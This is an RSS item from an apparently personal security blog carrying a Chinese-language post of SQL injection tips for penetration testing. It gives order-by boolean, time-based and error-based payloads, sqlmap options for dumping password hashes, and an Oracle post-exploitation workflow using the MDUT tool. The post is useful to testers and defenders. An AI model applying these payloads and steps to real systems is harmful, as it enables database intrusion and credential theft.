<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>SQLi on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/tags/sqli/</link><description>Recent content in SQLi on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Wed, 05 Jul 2023 21:37:07 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/tags/sqli/index.xml" rel="self" type="application/rss+xml"/><item><title>SQL注入在实战中的Tips合集</title><link>https://amiaaaz.github.io/2023/07/05/sqli-tricks-in-pentest/</link><pubDate>Wed, 05 Jul 2023 21:37:07 +0800</pubDate><guid>https://amiaaaz.github.io/2023/07/05/sqli-tricks-in-pentest/</guid><description>&lt;p>锐意更新中:)&lt;/p>
&lt;hr>
&lt;h2 id="order-by注入">order by注入&lt;/h2>
&lt;p>老生常谈，参数中出现可能为字段或表名、或出现排序有关的（比如desc, asc）就会被怀疑是sql注入点，但不是所有这种“疑似能注入”的地方都能被注——或者说重点关注什么样的字段是有说法的，这一点结合sql注入防御会更好理解&lt;/p>
&lt;p>以php为例，php.ini可以设置&lt;code>magic_quotes_gpc=on&lt;/code>开启对引号的转义，mysql中设&lt;code>secure_file_priv=null&lt;/code>，代码中使用PDO预编译并设置&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230705224758318.png" alt="image-20230705224758318">&lt;/p>
&lt;p>以上三项如果设置有误同样会导致报错注入的产生&lt;/p>
&lt;p>java中的防御步骤类似，除了叠waf以外 也无非是转义/预编译、黑/白名单、设权限三板斧，后两者先不论， &lt;strong>mybatis&lt;/strong>在对参数进行预处理时是不可以对order by后的参数使用&lt;code>#{}&lt;/code>的，而是只可以使用&lt;code>${}&lt;/code>！原因时order by语句后的字段名或字段位置是不可以加引号的，而使用预编译则一定会带&lt;code>'&lt;/code>，导致可能出现的注入（普通预编译也会这样）；而&lt;strong>Hibernate&lt;/strong>相对来说可以避免这一问题&lt;/p>
&lt;p>而order by注入本身由于语义的原因 是不能直接使用&lt;code>and 1=1&lt;/code>来判断的，需要用到条件语句做嵌套，举例：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">select&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#00a8c8">from&lt;/span> &lt;span style="color:#00a8c8">admin&lt;/span> &lt;span style="color:#00a8c8">order&lt;/span> &lt;span style="color:#00a8c8">by&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">password&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#f92672">#&lt;/span> &lt;span style="color:#111">example&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">select&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#00a8c8">from&lt;/span> &lt;span style="color:#00a8c8">admin&lt;/span> &lt;span style="color:#00a8c8">order&lt;/span> &lt;span style="color:#00a8c8">by&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#111">substr&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#00a8c8">select&lt;/span> &lt;span style="color:#00a8c8">user&lt;/span>&lt;span style="color:#111">()),&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">),&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">password&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>时间盲注也不能简单使用&lt;code>sleep()&lt;/code>，因为会对查询的每条内容执行排序 可能会造成ddos，需要用到子查询&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">select&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#00a8c8">from&lt;/span> &lt;span style="color:#00a8c8">admin&lt;/span> &lt;span style="color:#00a8c8">order&lt;/span> &lt;span style="color:#00a8c8">by&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#111">substr&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#00a8c8">select&lt;/span> &lt;span style="color:#00a8c8">user&lt;/span>&lt;span style="color:#111">()),&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">),&lt;/span>&lt;span style="color:#111">sleep&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span>&lt;span style="color:#111">),&lt;/span>&lt;span style="color:#111">password&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#f92672">#&lt;/span> &lt;span style="color:#111">may&lt;/span> &lt;span style="color:#111">ddos&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">select&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#00a8c8">from&lt;/span> &lt;span style="color:#00a8c8">admin&lt;/span> &lt;span style="color:#00a8c8">order&lt;/span> &lt;span style="color:#00a8c8">by&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#111">substr&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#00a8c8">select&lt;/span> &lt;span style="color:#00a8c8">user&lt;/span>&lt;span style="color:#111">()),&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">),(&lt;/span>&lt;span style="color:#00a8c8">select&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#00a8c8">from&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">select&lt;/span> &lt;span style="color:#111">sleep&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">b&lt;/span>&lt;span style="color:#111">),&lt;/span>&lt;span style="color:#111">password&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>报错&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">select&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#00a8c8">from&lt;/span> &lt;span style="color:#00a8c8">admin&lt;/span> &lt;span style="color:#00a8c8">order&lt;/span> &lt;span style="color:#00a8c8">by&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">extractvalue&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">concat&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">x3a&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">version&lt;/span>&lt;span style="color:#111">())),&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="sqlmap实用参数">sqlmap实用参数&lt;/h2>
&lt;p>官方文档：https://github.com/sqlmapproject/sqlmap/wiki/Usage&lt;/p>
&lt;ul>
&lt;li>&lt;code>-p &amp;quot;&amp;lt;param&amp;gt;&amp;quot;&lt;/code>：指定注入参数，如遇POST+json类型的请求包（或需要自定义注入位置） 在要注入的位置加&lt;code>*&lt;/code>&lt;/li>
&lt;li>&lt;code>-U &amp;quot;CU&amp;quot; --passwords&lt;/code>：爆破当前用户的密码hash，&lt;code>--passwords&lt;/code>爆所有用户hash&lt;/li>
&lt;li>&lt;code>--csrf-token=&amp;quot;&amp;lt;csrf name&amp;gt;&amp;quot;&lt;/code>：指定页面隐藏的csrf-token参数，可通过&lt;code>--csrf-url=&amp;quot;&amp;lt;url&amp;gt;&amp;quot;&lt;/code>指定token来源的地址，还可以通过&lt;code>--eval&lt;/code>配合处理多个参数（效果拔群）&lt;/li>
&lt;li>&lt;code>--gui&lt;/code>：启动自带GUI界面，包含各种参数的使用说明&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230705174602794.png" alt="image-20230705174602794">&lt;/p>
&lt;ul>
&lt;li>sqlmap根目录下自带一个&lt;code>sqlmapapi.py&lt;/code> 封装了一些接口，可以通过这些接口发起扫描（不常见也不常用，但应该对造轮子有帮助&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230705174431111.png" alt="image-20230705174431111">&lt;/p>
&lt;h2 id="sqlmap坑点">sqlmap坑点&lt;/h2>
&lt;ul>
&lt;li>&lt;code>--batch&lt;/code>在windows和linux上表现不同&lt;/li>
&lt;li>如果不是&lt;code>-r&lt;/code>指定请求包，请注意sqlmap发包是否会导致相应包全是302，如果出现这种情况 建议指定部分请求头&lt;/li>
&lt;li>小概率出现：别人电脑上能跑出来注入 但你不行的玄学情况，偶发性bug 暂未找到原因&lt;/li>
&lt;/ul>
&lt;h2 id="oracle注入及后续利用">Oracle注入及后续利用&lt;/h2>
&lt;p>单独把Oracle数据库拿出来说的原因是sqlmap并不支持对它执行&lt;code>--os-cmd&lt;/code>或&lt;code>--os-shell&lt;/code>，所以与mysql, mssql相比稍有区别&lt;/p>
&lt;ol>
&lt;li>
&lt;p>收集信息，库名、表名一把梭，列列重要数据 &lt;del>（刷分用&lt;/del>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>查当前用户的密码hash并尝试爆明文&lt;/p>
&lt;/li>
&lt;/ol>
&lt;pre tabindex="0">&lt;code>--is-dba # 是否dba
-U &amp;#34;CU&amp;#34; --passwords # 当前用户密码
--passwords # 所有用户密码
&lt;/code>&lt;/pre>&lt;ol start="3">
&lt;li>用sql-shell查当前SID和当前ip，尝试外连&lt;/li>
&lt;/ol>
&lt;pre tabindex="0">&lt;code>select instance_name from v$instance
select sys_context(&amp;#39;userenv&amp;#39;,&amp;#39;ip_address&amp;#39;) from dual
&lt;/code>&lt;/pre>&lt;ol start="4">
&lt;li>如果可以外连，用 &lt;a href="https://github.com/SafeGroceryStore/MDUT">Multiple Database Utilization Tools&lt;/a>做后续利用&lt;/li>
&lt;/ol>
&lt;p>*此处举例用户名为sys（是dba），用户名这里需要改为&lt;code>sys as sysdba&lt;/code>才能正确连接！&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230705180830895.png" alt="image-20230705180830895">&lt;/p>
&lt;p>MDUT自带了HTTP隧道功能，还有常见的提权一把梭+列系统文件&lt;/p>
&lt;ol start="5">
&lt;li>
&lt;p>*如果不能外连但为高权限用户，尝试执行java代码反弹（待补充）&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Navicat或DBeaver查看数据库内具体内容；Navicat可以使用对应的隧道&lt;/p>
&lt;/li>
&lt;/ol></description></item></channel></rss>